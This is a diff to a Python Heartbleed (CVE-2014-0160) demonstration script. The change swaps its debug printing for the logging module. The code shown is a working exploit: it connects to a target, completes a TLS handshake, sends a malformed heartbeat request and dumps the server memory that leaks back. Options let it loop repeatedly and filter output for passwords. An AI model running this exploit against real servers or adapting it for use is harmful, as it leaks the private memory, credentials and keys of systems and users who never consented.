@@ -1,5 +1,5 @@
 #!/bin/python3
-
+#
 # Demo of heartbleed(CVE-2014-0160)
 #
 # @Author Huang Yuzhong (hyzgog@gmail.com)
@@ -10,6 +10,7 @@ import struct
 import socket
 import time
 import codecs
+import logging
 from optparse import OptionParser
 
 decode_hex = codecs.getdecoder('hex_codec')
@@ -22,10 +23,6 @@ opts, args = options.parse_args()
 
 def h2bin(x):
 	return decode_hex(x.replace(' ', '').replace('\n', '').replace('\t', ''))[0]
-
-def debug(*arg):
-	if opts.output != 'password':
-		print(*arg)
 
 # binary data, copy from web
 hello = h2bin('''
@@ -96,14 +93,14 @@ def recvall(s, length, timeout=5):
 def recvmsg(s):
 	hdr = recvall(s, 5)
 	if hdr is None:
-		debug('Unexpected EOF receiving record header - server closed connection')
+		logging.warning('Unexpected EOF receiving record header - server closed connection')
 		return None, None, None
 	typ, ver, ln = struct.unpack('>BHH', hdr)
 	pay = recvall(s, ln, 10)
 	if pay is None:
-		debug('Unexpected EOF receiving record payload - server closed connection')
+		logging.warning('Unexpected EOF receiving record payload - server closed connection')
 		return None, None, None
-	debug(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
+	logging.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
 	return typ, ver, pay
 
 def hit_hb(s):
@@ -112,45 +109,45 @@ def hit_hb(s):
 		typ, ver, pay = recvmsg(s)
 
 		if typ is None:
-			debug('No heartbeat response received, server likely not vulnerable')
+			logging.error('No heartbeat response received, server likely not vulnerable')
 			return False
 
 		if typ == 24:
-			debug('Received heartbeat response:')
+			logging.info('Received heartbeat response:')
 			dump(pay)
 			if len(pay) > 3:
-				debug( 'WARNING: server returned more data than it should - server is vulnerable!')
+				logging.warning('Server returned more data than it should - server is vulnerable!')
 			else:
-				debug( 'Server processed malformed heartbeat, but did not return any extra data.')
+				logging.warning('Server processed malformed heartbeat, but did not return any extra data.')
 			return True
 
 		if typ == 21:
-			debug('Received alert:')
+			logging.warning('Received alert:')
 			dump(pay)
-			debug('Server returned error, likely not vulnerable')
+			logging.error('Server returned error, likely not vulnerable')
 			return False
 
 def main(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	debug('Connecting...')
+	logging.info('Connecting...')
 	s.connect((host, port))
 
-	debug('Sending Client Hello...')
+	logging.info('Sending Client Hello...')
 	s.send(hello)
 
-	debug('Waiting for Server Hello...')
+	logging.info('Waiting for Server Hello...')
 
 	while True:
 		typ, ver, pay = recvmsg(s)
 		if typ == None:
-			debug('Server closed connection without sending Server Hello.')
+			logging.error('Server closed connection without sending Server Hello.')
 			return
 		# Look for server hello done message.
 		if typ == 22 and pay[0] == 0x0E:
 			break
 
-	debug('Sending heartbeat request...')
+	logging.info('Sending heartbeat request...')
 	s.send(hb)
 	hit_hb(s)
 
@@ -158,6 +155,11 @@ if __name__ == '__main__':
 	if len(args) < 1:
 		options.print_help()
 	else:
+		if opts.output == 'password':
+			logging.basicConfig(level=logging.CRITICAL)
+		else:
+			logging.basicConfig(level=logging.INFO)
+
 		if opts.loop:
 			while True:
 				main(args[0], opts.port)
